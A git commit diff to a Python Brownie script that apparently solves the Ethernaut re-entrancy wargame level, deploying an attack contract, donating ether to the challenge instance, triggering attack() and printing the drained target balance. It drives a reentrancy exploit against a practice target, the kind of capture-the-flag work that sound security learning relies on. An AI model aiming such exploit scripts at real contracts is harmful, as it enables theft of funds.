297c250618e8be265deeffe14d6634fa7f4e64b7
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-22 17:01:57 +0100

    update 10-deploy_attack.py

--- scripts/10-deploy_attack.py
+++ scripts/10-deploy_attack.py
@@ -2,6 +2,7 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, Attack10, interface
 
 ETHERNAUT_INSTANCE = "0x58C7cdda21c43803DcFE82CE7E41926816df7bb9"
+PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
 AMOUNT = "0.01 ether"
 GAS_LIMIT = 6000000
 
@@ -10,6 +11,7 @@ def main():
 
     # set player account
     player = get_account()
+
     # set target (interface address)
     target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
     print(f"Target address under attack = {target}")
@@ -18,7 +20,15 @@ def main():
     attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
 
     # donate ether to the target contract
-    # ToDo
+    target.donate(ETHERNAUT_INSTANCE, {"from": player, "value": AMOUNT})
 
     # call the attack() function, on my attack contract
     attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
+
+    #  check balance (in ether) of the target contract
+    current_balance_target = target.balance()
+    eth_balance = web3.fromWei(current_balance_target, "ether")
+
+    # ####  could print all of these values to a log file?
+
+    print(f"\nCurrent balance of the target = {eth_balance} ether\n")
